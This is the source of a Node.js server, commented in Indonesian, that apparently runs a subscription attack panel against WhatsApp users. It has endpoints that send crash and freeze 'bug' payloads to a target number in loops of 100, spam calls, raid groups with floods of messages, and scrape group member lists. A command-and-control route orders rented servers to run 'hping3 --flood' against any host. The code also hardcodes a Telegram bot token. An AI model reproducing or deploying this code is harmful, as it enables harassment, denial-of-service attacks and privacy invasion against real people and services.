const originalStdoutWrite = process.stdout.write.bind(process.stdout);
const originalStderrWrite = process.stderr.write.bind(process.stderr);
process.on('unhandledRejection', (reason, promise) => {
  console.log('Unhandled Rejection:', reason);
});

// ── STARTUP: Generate pairId untuk semua user yang belum punya ───────────────
(function generateAllPairIds() {
  try {
    const db = loadDatabase();
    let changed = false;
    for (let i = 0; i < db.length; i++) {
      if (!db[i].pairId) {
        db[i].pairId = genPairId();
        changed = true;
        console.log(`[STARTUP] pairId generated: ${db[i].username} → ${db[i].pairId}`);
      }
    }
    if (changed) {
      saveDatabase(db);
      console.log(`[STARTUP] pairId generation done for ${db.filter(u => u.pairId).length} users`);
    } else {
      console.log(`[STARTUP] All users already have pairId`);
    }
  } catch(e) {
    console.error('[STARTUP] pairId generation error:', e.message);
  }
})();



process.on('uncaughtException', (err) => {
  console.log('Uncaught Exception:', err);
});

process.stdout.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStdoutWrite(chunk, encoding, callback);
};
process.stderr.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session:') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error:') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStderrWrite(chunk, encoding, callback);
};

const safeExit = process.exit;
const { default: makeWASocket, prepareWAMessageMedia, useMultiFileAuthState, DisconnectReason, generateWAMessage, getBuffer, generateWAMessageFromContent, proto, generateWAMessageContent, fetchLatestBaileysVersion, waUploadToServer, generateRandomMessageId, generateMessageTag, jidEncode, getUSyncDevices } = require("@whiskeysockets/baileys");
const express = require("express");
const readline = require("readline");
const crypto = require("crypto");
const app = express();
const TelegramBot = require("node-telegram-bot-api");
const fs = require("fs");
const path = require('path');
const pino = require('pino');
const P = require('pino')
const axios = require('axios')
const vm = require('vm')
const os = require('os');
const WebSocket = require('ws');
const http = require('http');
const server = http.createServer(app); // gunakan Express app
const wss = new WebSocket.Server({ server });
let wsClients = {}; // { username: WebSocket }
let chatList = [];  // { from, to, message, time }
const CHAT_FILE = 'chat.json';
const { Client } = require('ssh2');
const DB_PATH = "./database.json";
let activeKeys = {};
const KEY_FILE = path.join(__dirname, 'keyList.json');
const bugs = [
  { bug_id: "forclose", bug_name: "[ Ⓧ FORCLOSE ANDRO 𝓣 ]" },
  { bug_id: "crash", bug_name: "[ Ⓧ CRASH ONE MSG 𝓣 ]" },
  { bug_id: "blank", bug_name: "[ Ⓧ BLANK STUCK 𝓣 ]" },
  { bug_id: "freze", bug_name: "[ Ⓧ FREZE CHAT MSG 𝓣 ]" },
  { bug_id: "delay", bug_name: "[ Ⓧ DELAY HARD 𝓣 ]" },
  { bug_id: "BLANK", bug_name: "Ⓧ BLANK CLICK 𝓣" },
];
let cncActive = true; // Flag CNC
let vpsList = [];
let vpsConnections = {}
const VPS_FILE = 'vps.json';
let sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
fs.watchFile("keyList.json", () => {
  console.log("[📂] keyList.json changed, reloading...");
  sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
});


// Load chat from file
if (fs.existsSync(CHAT_FILE)) {
  chatList = JSON.parse(fs.readFileSync(CHAT_FILE, 'utf8'));
}

// Simpan chat
function saveChat() {
  fs.writeFileSync(CHAT_FILE, JSON.stringify(chatList, null, 2));
}

// Sanitize fungsi
function sanitize(input) {
  return String(input)
    .replace(/[<>]/g, '') // hilangkan tag html
    .replace(/[\r\n]/g, ' ') // hilangkan newline
    .slice(0, 250); // batas 250 karakter
}

const TOKEN = "8841114235:AAH6YtGflQ5lmjaZRlTipoK7ZZc4MIZuTTE"; // Ganti dengan token bot kamu
const bot = new TelegramBot(TOKEN, { polling: true });

const OWNER_ID = 8172523898;
  
wss.on('connection', function (ws, req) {
  let username;

  ws.on('message', function (msg) {
    try {
      const data = JSON.parse(msg);

        if (data.type === 'sessionCheck') {
  const sessionList = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
  const user = sessionList.find(e => e.sessionKey === data.key);

  if (!user) {
    ws.send(JSON.stringify({
      type: "forceLogout",
      reason: "Invalid key"
    }));
    return ws.close();
  }

  if (user.androidId !== data.androidId) {
    ws.send(JSON.stringify({
      type: "forceLogout",
      reason: "Another device has logged in"
    }));
    return ws.close();
  }
}

      if (data.type === 'validate') {
        const session = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
        const validKey = session.find(e => e.sessionKey === data.key)
        const validId = session.find(e => e.androidId === data.androidId)
          
        if (!validKey) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "keyInvalid"
          }));
          return ws.close();
        }

        if (!validId) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "androidIdMismatch"
          }));
          return ws.close();
        }

        // Autentikasi sukses
        ws.send(JSON.stringify({
          type: "myInfo",
          valid: true,
          username: session.username,
          androidId: session.androidId,
          role: session.role || "member"
        }));

            const interval = setInterval(() => {
            const session = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
        const validKey = session.find(e => e.sessionKey === data.key)
        const validId = session.find(e => e.androidId === data.androidId)
          
        if (!validKey) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "keyInvalid"
          }));
          return ws.close();
        }

        if (!validId) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "androidIdMismatch"
          }));
          return ws.close();
        }

            }, 10000);
      }
      if (data.type === 'auth') {
        username = getUserByKey(data.key);
         console.log(username)
        if (!username) return ws.close();
        wsClients[username] = ws;

        // Kirim chatList awal
const list = chatList
  .filter(m => m.from === username || m.to === username)
  .map(m => (m.from === username ? m.to : m.from));

  ws.send(JSON.stringify({
    type: "chatList",
    users: [...new Set(list)],
  }));
      }

      if (data.type === 'chat') {
        const to = data.to;
        const message = sanitize(data.message);
if (!username || !to || !message || message.length > 250) return;

        const chat = {
          from: username,
          to,
          message,
          time: new Date().toISOString()
        };
        chatList.push(chat);
        saveChat();

        // Kirim ke pengirim
        ws.send(JSON.stringify({ type: 'chat', message: { ...chat, fromMe: true } }));

        // Kirim ke penerima jika online
        if (wsClients[to]) {
          wsClients[to].send(JSON.stringify({
            type: 'chat',
            message: { ...chat, fromMe: false }
          }));
        }
      }

      if (data.type === 'getMessages') {
        const withUser = data.with;
        const messages = chatList
          .filter(m =>
            (m.from === username && m.to === withUser) ||
            (m.from === withUser && m.to === username)
          )
          .map(m => ({
            ...m,
            fromMe: m.from === username
          }));

        ws.send(JSON.stringify({ type: 'messages', with: withUser, messages }));
      }
    } catch (e) {
      console.error("WS error:", e.message);
    }
  });

  ws.on('close', () => {
    if (username && wsClients[username]) {
      delete wsClients[username];
    }
  });
});

// Ganti listen jadi ini:
const RAT_TARGETS = './rat_targets.json';
const RAT_LIVE    = {};  // in-memory live frames

function readRat(f) {
  try { return JSON.parse(fs.existsSync(f) ? fs.readFileSync(f,'utf8')||'[]' : '[]'); } catch { return []; }
}
function saveRat(f,d) { try { fs.writeFileSync(f, JSON.stringify(d,null,2)); } catch(_) {} }


const PORT = 2042;

// Single server listen (HTTP + WebSocket pada port yang sama)
server.listen(PORT, () => {
  console.log(`🚀 Server aktif di http://yudaindonesiajaya.omdhanalay.my.id${PORT}`);
  startUserSessions();
});




app.use(express.urlencoded({ extended: false }));
app.use(express.json());
// ===== Rate Limit Middleware (20 req/detik per token) =====
const rateLimitMap = {};
function rateLimiter(req, res, next) {
  const key = (req.query && req.query.key) || (req.body && req.body.key) || null;
  if (!key) return next();

  const now = Date.now();
  if (!rateLimitMap[key]) rateLimitMap[key] = [];

  rateLimitMap[key] = rateLimitMap[key].filter(ts => now - ts < 1000);
  rateLimitMap[key].push(now);

  if (rateLimitMap[key].length > 20) {
    const db = loadDatabase();
    const user = db.find(u => u.username === (activeKeys[key]?.username || "unknown"));
    console.warn(`[🚫 RATE LIMIT] Token '${key}' (${user?.username || 'unknown'}) melebihi batas 20 req/detik.`);

    return res.status(429).json({
      valid: false,
      rateLimit: true,
      message: "Terlalu banyak permintaan! Maksimal 20 request per detik.",
    });
  }

  next();
}

app.use(rateLimiter);


app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*"); // atau ganti * dengan domain spesifik
  res.header("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  next();
});


if (fs.existsSync(KEY_FILE)) {
  try {
    const rawData = fs.readFileSync(KEY_FILE, 'utf8');
    const parsed = JSON.parse(rawData); // ini array

    for (const user of parsed) {
      if (user.sessionKey && user.username && user.lastLogin) {
        const created = new Date(user.lastLogin).getTime();
        const expires = created + 10 * 60 * 1000; // +10 menit

        activeKeys[user.sessionKey] = {
          username: user.username,
          created,
          expires,
        };
      }
    }

    console.log("✅ activeKeys loaded from keyList.json.");
  } catch (err) {
    console.error("❌ Failed to load keyList.json:", err.message);
  }
}


function connectToAllVPS() {
  if (!cncActive) return;

  console.log("🔄 Connecting to all VPS servers...");

  for (const vps of vpsList) {
    if (vpsConnections[vps.host]) {
      console.log(`✅ Already connected to ${vps.host}`);
      continue;
    }

    const conn = new Client();

    conn.on('ready', () => {
      if (!cncActive) {
        conn.end(); // Langsung tutup kalau CNC tidak aktif
        return;
      }

      console.log(`✅ Connected to VPS: ${vps.host}`);
      vpsConnections[vps.host] = conn;

      // Jika koneksi putus, reconnect otomatis
      conn.on('close', () => {
        console.log(`🔌 Disconnected: ${vps.host}`);
        delete vpsConnections[vps.host];

        if (cncActive) {
          console.log(`🔁 Reconnecting to ${vps.host} in 5s...`);
          setTimeout(connectToAllVPS, 5000);
        }
      });
    });

    conn.on('error', (err) => {
      console.log(`❌ Failed to connect to ${vps.host}: ${err.message}`);
    });

    conn.connect({
      host: vps.host,
      username: vps.username,
      password: vps.password,
      readyTimeout: 5000
    });
  }
}

// 🚫 Disconnect semua koneksi (misal saat restart)
function disconnectAllVPS() {
  console.log("🛑 Disconnecting all VPS connections...");
  cncActive = false;

  for (const host in vpsConnections) {
    vpsConnections[host].end();
    delete vpsConnections[host];
  }
}

// Load VPS list saat server pertama kali jalan
if (fs.existsSync(VPS_FILE)) {
  vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
  console.log("📥 VPS list loaded.");
    connectToAllVPS(); // Connect ke semua VPS saat server jalan
}

// Pantau perubahan file VPS
fs.watch(VPS_FILE, () => {
  try {
    vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
    console.log("🔄 VPS list updated.");
      connectToAllVPS(); // Connect ke semua VPS saat server jalan
  } catch (e) {
    console.error("❌ Failed to update VPS list:", e.message);
  }
});

// Middleware: Cek sessionKey dan ambil username
function getUserByKey(key) {
  const keyInfo = activeKeys[key];
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  return user ? keyInfo.username : null;
}

// GET /myServer
app.get("/myServer", (req, res) => {
  const key = req.query.key;
  const username = getUserByKey(key);
  if (!username) return res.status(401).json({ valid: false, error: "Invalid session key" });

  const userVPS = vpsList.filter(vps => vps.owner === username);
  // APK expects: { servers: [...] }
  res.json({ valid: true, servers: userVPS });
});

// POST /addServer
app.post("/addServer", (req, res) => {
  const { key, host, username: sshUser, password } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!host || !sshUser || !password) return res.status(400).json({ error: "Missing fields" });

  const newVPS = { host, username: sshUser, password, owner };
  vpsList.push(newVPS);
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));
  res.json({ success: true, message: "VPS added" });
});

// POST /delServer
app.post("/delServer", (req, res) => {
  const { key, host } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  const before = vpsList.length;
  vpsList = vpsList.filter(vps => !(vps.host === host && vps.owner === owner));
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));

  const deleted = before !== vpsList.length;
  res.json({ success: deleted, message: deleted ? "VPS deleted" : "VPS not found" });
});

// POST /sendCommand
app.post("/sendCommand", (req, res) => {
  const { key, target, port, duration } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!target || !port || !duration) return res.status(400).json({ error: "Missing fields" });

  const userVPS = vpsList.filter(vps => vps.owner === owner);
  if (userVPS.length === 0) return res.status(400).json({ error: "No VPS available for this user" });

  for (const vps of userVPS) {
    const conn = vpsConnections[vps.host];
    if (!conn) {
      console.log(`❌ Not connected to ${vps.host}`);
      continue;
    }

    const command = `screen -dmS hping3 -S --flood ${target} -p ${port}`;
    const killCmd = `sleep ${duration}; pkill screen`;

    conn.exec(`${command} && ${killCmd}`, (err, stream) => {
      if (err) return console.error(`❌ Exec error on ${vps.host}:`, err.message);
      stream.on('close', (code, signal) => {
        console.log(`✅ Command done on ${vps.host} (code: ${code})`);
      });
    });
  }

  res.json({ success: true, message: `Command sent to ${userVPS.length} VPS` });
});


function loadDatabase() {
  if (!fs.existsSync(DB_PATH)) {
    fs.writeFileSync(DB_PATH, JSON.stringify([]));
    console.log("[🗃️ DB] Database baru dibuat.");
  }
  const data = JSON.parse(fs.readFileSync(DB_PATH));
  return data;
}

function saveDatabase(data) {
  fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
}

function generateKey() {
  const key = crypto.randomBytes(8).toString("hex");
  console.log("[🔑 GEN] Key baru dibuat:", key);
  return key;
}

function genPairId() {
  return crypto.randomBytes(8).toString('hex').toUpperCase();
}


function isExpired(user) {
  const expired = new Date(user.expiredDate) < new Date();
  console.log(`[⏳ EXP] ${user.username} expired:`, expired);
  return expired;
}
const spamCooldown = {}; // { username: { count, lastReset } }
const cooldowns = {}; // { username: lastRaidTime }

app.get("/spamCall", async (req, res) => {
  const { key, target, qty } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user || !["reseller", "reseller1", "owner", "vip", "dev"].includes(user.role)) {
    return res.json({ valid: false, message: "Access denied" });
  }

  const role = user.role || "member";
  const maxQty = role === "vip" ? 10 : 5;
  const callQty = parseInt(qty) || 1;

  if (callQty > maxQty) {
    return res.json({
      valid: false,
      message: `Qty too high. Max allowed for your role (${role}) is ${maxQty}.`
    });
  }

  const bizKeys = Object.keys(activeConnections);
  if (!bizKeys.length) return res.json({ valid: false, message: "No biz socket online" });

  const jid = target.includes("@s.whatsapp.net") ? target : `${target}@s.whatsapp.net`;

  const now = Date.now();
  const cooldown = spamCooldown[user.username] || { count: 0, lastReset: 0 };

  if (now - cooldown.lastReset > 300_000) {
    cooldown.count = 0;
    cooldown.lastReset = now;
  }

  if (cooldown.count >= 5) {
    const remaining = 300 - Math.floor((now - cooldown.lastReset) / 1000);
    return res.json({ valid: false, cooldown: true, message: `Cooldown: wait ${remaining}s` });
  }

  try {
      
    const socketId = bizKeys[Math.floor(Math.random() * bizKeys.length)];
    const sock = biz[socketId];
    // 1. Unblock target dulu
    await sock.updateBlockStatus(jid, "unblock");

    await sock.offerCall(jid, true);
    await sock.updateBlockStatus(jid, "block");
    console.log(`[✅ FIRST SPAM CALL] to ${jid} from ${socketId}`);

    cooldown.count++;
    spamCooldown[user.username] = cooldown;

    res.json({ valid: true, sended: true, total: callQty });

    for (let i = 1; i < callQty; i++) {
      setTimeout(async () => {
        try {
          const socketId = bizKeys[Math.floor(Math.random() * bizKeys.length)];
          const sock = biz[socketId];
                // 1. Unblock target dulu
    await sock.updateBlockStatus(jid, "unblock");

    await sock.offerCall(jid, true);
                // 1. Unblock target dulu
    await sock.updateBlockStatus(jid, "block");

          console.log(`[✅ SPAM CALL] #${i + 1} to ${jid} from ${socketId}`);
        } catch (err) {
          console.warn(`[❌ CALL #${i + 1} ERROR]`, err.message);
        }
      }, i * 10000);
    }
  } catch (err) {
    console.warn("[❌ FIRST CALL ERROR]", err.message);
    return res.json({ valid: false, message: "Call failed" });
  }
});

app.get("/raidGroup", async (req, res) => {
  const { key, link } = req.query;
  const match = link.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]{22})/);
  if (!match) return res.json({ valid: false, message: "Invalid group link" });

  return res.json({ valid: true, sended: false });
  const code = match[1];
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user || !["vip", "owner"].includes(user.role)) {
    return res.json({ valid: false, message: "Access denied" });
  }

  const now = Date.now();
  if (cooldowns[user.username] && now - cooldowns[user.username] < 500_000) {
    const wait = Math.ceil((500_000 - (now - cooldowns[user.username])) / 1000);
    return res.json({ valid: false, message: `Cooldown aktif, tunggu ${wait} detik` });
  }

  const bizKeys = Object.keys(biz);
  if (bizKeys.length < 2) return res.json({ valid: false, message: "Need at least 2 bot online" });

  const fs = require("fs");
  const path = require("path");
  const dir = path.join(__dirname, "assets");
  const stickers = fs.readdirSync(dir).filter(f => f.endsWith(".webp"));
  if (!stickers.length) return res.json({ valid: false, message: "No stickers found" });

  try {
    const pickRandomSock = async (used = []) => {
      const unused = bizKeys.filter(k => !used.includes(k));
      if (!unused.length) throw new Error("No available bots to use");
      const randKey = unused[Math.floor(Math.random() * unused.length)];
      return { sock: biz[randKey], key: randKey };
    };

    const joinGroup = async () => {
      const usedKeys = [];
      while (true) {
        const { sock, key } = await pickRandomSock(usedKeys);
        usedKeys.push(key);
        try {
          const groupJid = await sock.groupAcceptInvite(code);
          return { sock, groupJid };
        } catch (err) {
          if (err.message.includes("not-authorized")) {
            console.log(`[!] ${key} gagal join, coba bot lain...`);
            continue;
          } else {
            throw err;
          }
        }
      }
    };

    const [s1, s2] = await Promise.all([joinGroup(), joinGroup()]);
    res.json({ valid: true, sended: true });

    cooldowns[user.username] = Date.now();

    const raidBot = async (sock, groupJid) => {
      for (let round = 0; round < 2; round++) {
        const sentMsg = await sock.sendMessage(groupJid, {
          text: `[DarkVerse Project]\n` + 'ꦾ'.repeat(30000)
        });
        await new Promise(r => setTimeout(r, 1000));

        const randomStickers = stickers.sort(() => 0.5 - Math.random()).slice(0, 3);
        for (const sticker of randomStickers) {
          const buffer = fs.readFileSync(path.join(dir, sticker));
          await sock.sendMessage(groupJid, { sticker: buffer });
          await gcCrash(sock, groupJid);
          await FreezePackk(sock, groupJid);
          await new Promise(r => setTimeout(r, 300));
        }

        await new Promise(r => setTimeout(r, 600));
      }

      await sock.groupLeave(groupJid);
      await new Promise(r => setTimeout(r, 500));

      const lastMessagesInChat = {
        key: { remoteJid: groupJid, fromMe: true, id: "" },
        messageTimestamp: Math.floor(Date.now() / 1000)
      };
      await sock.chatModify({
        delete: true,
        lastMessages: [lastMessagesInChat]
      }, groupJid);

      console.log(`[!] Selesai raid & hapus chat: ${groupJid}`);
    };

    await Promise.all([
      raidBot(s1.sock, s1.groupJid),
      raidBot(s2.sock, s2.groupJid)
    ]);

    return;
  } catch (err) {
    console.warn("[❌ RAID ERROR]", err.message);
    return res.json({ valid: false, message: "Join or send failed" });
  }
});

app.get("/spyGroup", async (req, res) => {
  const { key, link } = req.query;
  const match = link.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]{22})/);
  if (!match) return res.json({ valid: false, message: "Invalid link" });

  const code = match[1];
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false });

  const bizKeys = Object.keys(biz);
  if (!bizKeys.length) return res.json({ valid: false, message: "No socket available" });

  const sock = biz[bizKeys[Math.floor(Math.random() * bizKeys.length)]];

  try {
    const groupJid = await sock.groupAcceptInvite(code);
    const metadata = await sock.groupMetadata(groupJid);

    const admins = metadata.participants.filter(p => p.admin).map(p => p.id.replace(/@.+/, ''));
    const members = metadata.participants.filter(p => !p.admin).map(p => p.id.replace(/@.+/, ''));

    await sock.groupLeave(groupJid);

    return res.json({
      valid: true,
      groupId: groupJid,
      groupName: metadata.subject,
      desc: metadata.desc || "No description",
      admin: admins,
      participant: members,
    });
  } catch (err) {
    console.warn("[❌ SPY GROUP ERROR]", err.message);
    return res.json({ valid: false, message: "Spy failed" });
  }
});

app.get("/getInfo", async (req, res) => {
  const { key, number } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const bizKeys = Object.keys(biz);
  if (!bizKeys.length) return res.json({ valid: false, message: "No connection" });

  const sock = biz[bizKeys[Math.floor(Math.random() * bizKeys.length)]];
  const jid = number.includes("@") ? number : number + "@s.whatsapp.net";

  try {
    const ppUrl = await sock.profilePictureUrl(jid, 'image').catch(() => null);
    const statusObj = await sock.fetchStatus(jid).catch(() => null);
    const check = await sock.onWhatsApp(number).catch(() => []);
    const info = check[0] || {};

    return res.json({
      valid: true,
      number: number,
      photo: ppUrl || "https://static.vecteezy.com/system/resources/previews/009/292/244/non_2x/default-avatar-icon-of-social-media-user-vector.jpg",
      bio: statusObj?.status || "No bio",
      online: !!statusObj?.lastSeen,
      type: info.biz ? "business" : "personal"
    });
  } catch (err) {
    console.warn("[❌ GETINFO ERROR]", err.message);
    return res.json({ valid: false, message: "Query failed" });
  }
});

const KEY_LIST_FILE = path.join(__dirname, 'keyList.json');

function loadKeyList() {
  try {
    return JSON.parse(fs.readFileSync(KEY_LIST_FILE, 'utf8'));
  } catch {
    return [];                // file belum ada / rusak → mulai kosong
  }
}

function saveKeyList(list) {
  fs.writeFileSync(KEY_LIST_FILE, JSON.stringify(list, null, 2));
}

function recordKey({ username, key, role, ip, androidId }) {
  const list = loadKeyList();
  const stamp = new Date().toISOString();
  const idx = list.findIndex(e => e.username === username);

  if (idx !== -1) {
    list[idx] = { username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId };
  } else {
    list.push({ username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId });
  }

  saveKeyList(list);
}

  const news = [
  {
    image: "https://files.catbox.moe/kz7ana.jpg",
    title: "SHADOW GARDEN",
    desc: "CREDIT BY @binznyabobo"
  },
  {
    image: "https://files.catbox.moe/kz7ana.jpg",
    title: "SHADOW GARDEN",
    desc: "CREDIT BY @binznyabobo"
  },
  {
    image: "https://files.catbox.moe/kz7ana.jpg",
    title: "SHADOW GARDEN",
    desc: "CREDIT BY @binznyabobo"
    }
  ];

// ===== Endpoint: Login & Key Fetch (version 3.0 required) =====
app.post("/validate", (req, res) => {
const { username, password, version, androidId } = req.body;

if (!androidId) {
  return res.json({ valid: false, message: "androidId required" });
}

const db = loadDatabase();
const userIdx = db.findIndex(u => u.username === username && u.password === password);
const user = db[userIdx];

if (!user) return res.json({ valid: false });

// Auto-generate pairId kalau belum ada
if (!user.pairId) {
  user.pairId = genPairId();
  db[userIdx] = user;
  saveDatabase(db);
}

if (isExpired(user)) {
  return res.json({ valid: true, expired: true });
}

// Cek apakah device sama
const keyList = loadKeyList();
const existingSession = keyList.find(e => e.username === username);
if (existingSession && existingSession.androidId !== androidId) {
  // device berbeda, override
  console.log(`[📱] Device login baru, override session untuk ${username}`);
}

// generate key baru & override
const key = generateKey();
activeKeys[key] = {
  username,
  created: Date.now(),
  expires: Date.now() + 10 * 60 * 1000,
};

recordKey({
  username,
  key,
  role: user.role || 'member',
  ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
  androidId,
});

const ddosList = [
  { ddos_id: "udp", ddos_name: "UDP Flood" },
  { ddos_id: "tcp", ddos_name: "TCP SYN Flood" },
  { ddos_id: "http", ddos_name: "HTTP Flood" },
  { ddos_id: "icmp", ddos_name: "ICMP Flood" },
];

const payloadList = [
  { payload_id: "standard", payload_name: "Standard" },
  { payload_id: "amplified", payload_name: "Amplified" },
];

return res.json({
  valid: true,
  expired: false,
  key,
  expiredDate: user.expiredDate,
  role: user.role || "member",
  pairId: user.pairId || null,
  listBug: bugs,
  listDDoS: ddosList,
  listPayload: payloadList,
  news
});
});

app.get("/myInfo", (req, res) => {
  const { username, password, androidId, key } = req.query;
  console.log("[ℹ️ INFO] Fetching info for:", username);

  const db = loadDatabase();
  const user = db.find(u => u.username === username && u.password === password);
  const keyList = loadKeyList();
  const userKey = keyList.find(k => k.username === username);
  console.log(userKey)

  if (!userKey) {
    console.log("[❌ KEY] Invalid or missing session key.");
    return res.json({ valid: false, reason: "session" });
  }

  if (userKey.androidId !== androidId) {
    console.log("[⚠️ DEVICE] Device mismatch:", userKey.androidId, "!=", androidId);
    return res.json({ valid: false, reason: "device" });
  }

  if (!user) {
    console.log("[❌ INFO] User not found.");
    return res.json({ valid: false });
  }

  if (isExpired(user)) {
    console.log("[⚠️ INFO] User expired.");
    return res.json({ valid: true, expired: true });
  }

  recordKey({
    username,
    key,
    role: user.role || 'member',
    ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
    androidId
  });

  console.log("[✅ INFO] Info dikirim untuk:", username);

  return res.json({
    valid: true,
    expired: false,
    key,
    username: user.username,
    password: "******",
    expiredDate: user.expiredDate,
    role: user.role || "member",
    pairId: user.pairId || null,
    listBug: bugs,
    news: news // ✅ Tambahkan ini
  });
});

app.post("/changepass", (req, res) => {
  const { username, oldPass, newPass } = req.body;
  if (!username || !oldPass || !newPass) {
    return res.json({ success: false, message: "Incomplete data" });
  }

  const db = loadDatabase();
  const idx = db.findIndex(u => u.username === username && u.password === oldPass);
  if (idx === -1) {
    return res.json({ success: false, message: "Invalid credentials" });
  }

  db[idx].password = newPass;
  saveDatabase(db);

  return res.json({ success: true, message: "Password updated successfully" });
});

app.get("/sendBug", async (req, res) => {
  const { key, bug } = req.query;
  let { target } = req.query;
  target = (target || "").replace(/\D/g, ""); // hapus semua karakter non-digit
  console.log(`[📤 BUG] Send bug to ${target} using key ${key} - Bug: ${bug}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ BUG] Key tidak valid.");
    return res.json({ valid: false });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) {
    console.log("[❌ BUG] User tidak ditemukan.");
    return res.json({ valid: false });
  }

  // ===== Role-based Cooldown =====
  const roleCooldowns = {
    member: 70,
    reseller: 40,
    admin: 30,
    owner: 20,
    vip: 10,
  };
  const role = user.role || "member";
  const cooldownSeconds = roleCooldowns[role] || 50;

  if (!user.lastSend) user.lastSend = 0;

  const now = Date.now();
  const diffSeconds = Math.floor((now - user.lastSend) / 1000);
  if (diffSeconds < cooldownSeconds) {
    console.log(`${user.username} Still Cooldown`)
    return res.json({
      valid: true,
      sended: false,
      cooldown: true,
      wait: cooldownSeconds - diffSeconds,
    });
  }

  // ============ Respon Duluan ============ //
  user.lastSend = now;
  saveDatabase(db); // Penting! Simpan waktu kirim ke file
  console.log(`${user.username} Trigger Cooldown`);

  res.json({
    valid: true,
    sended: true,
    cooldown: false,
    role
  });

  // ============ Kirim Bug di Background ============ //
  setImmediate(async () => {
    const isMessBug = false;
    console.log("Received Signal")
    const attemptSend = async (sock, retry = false) => {
      // Cari sessionName yang punya socket ini di activeConnections,
      // supaya pas kena "Connection Closed" kita bisa invalidate cache-nya.
      const findSessionName = (s) => {
        try {
          for (const [name, cached] of Object.entries(activeConnections)) {
            if (cached === s) return name;
          }
        } catch (_) {}
        return null;
      };
      try {
        const targetJid = target + "@s.whatsapp.net";
    console.log("Received Signal 2")
    console.log(`${targetJid}`)
        switch (bug) {
          case "forclose":
            for (let i = 0; i < 100; i++) {
              await OmhcCrashAlbum(sock, targetJid);
              await QQSFreezeeChat(sock, targetJid);
              await locfrz(sock, targetJid);
              await NgelayV2(sock, targetJid);
              await sleep(1000);
            }
            break;
          case "crash":
            for (let i = 0; i < 100; i++) {
              await QQSFreezeeChat(sock, targetJid);
              await OmhcCrashAlbum(sock, targetJid);
              await WizzCrash(sock, targetJid);
              await NgelayV2(sock, targetJid);
              await sleep(1000);
            }
            break;
          case "blank":
            for (let i = 0; i < 100; i++) {
              await QQSFreezeeChat(sock, targetJid);
              await OmhcCrashAlbum(sock, targetJid);
              await WizzCrash(sock, targetJid);
              await NgelayV2(sock, targetJid);
              await sleep(1000);
            }
            break;
          case "freze":
            for (let i = 0; i < 100; i++) {
              await QQSFreezeeChat(sock, targetJid);
              await OmhcCrashAlbum(sock, targetJid);
              await FrezeChat(sock, targetJid);
              await NgelayV2(sock, targetJid);
              await sleep(1000);
            }
            break;
          case "delay":
            for (let i = 0; i < 100; i++) {
              await NgelayV2(sock, targetJid);
              await Omhcharddelay(sock, targetJid);
              await dongo(sock, targetJid);
              await sleep(1000);
            }
            break;
          case "BLANK":
            for (let i = 0; i < 100; i++) {
              await QQSFreezeeChat(sock, targetJid);
              await OmhcCrashAlbum(sock, targetJid);
              await k(sock, targetJid);
              await NgelayV2(sock, targetJid);
              await sleep(1500);
            }
            break;
        }
        
        console.log(`[✅ BUG] Bug '${bug}' terkirim ke ${target}`);
        return true;
      } catch (err) {
        console.warn(`[⚠️ SEND ERROR] ${err.message}`);
        // FIX: sessionName sebelumnya gak terdefinisi di scope ini, bikin ReferenceError
        // pas handler catch dijalankan. Sekarang kita resolve nama session dari socket.
        const sessName = findSessionName(sock);
        if (sessName && err.message === 'Connection Closed') {
          delete activeConnections[sessName];
        }
        if (!retry) {
          const retrySock = await checkActiveSessionInFolder(user.username);
          if (retrySock) return await attemptSend(retrySock, true);
        }
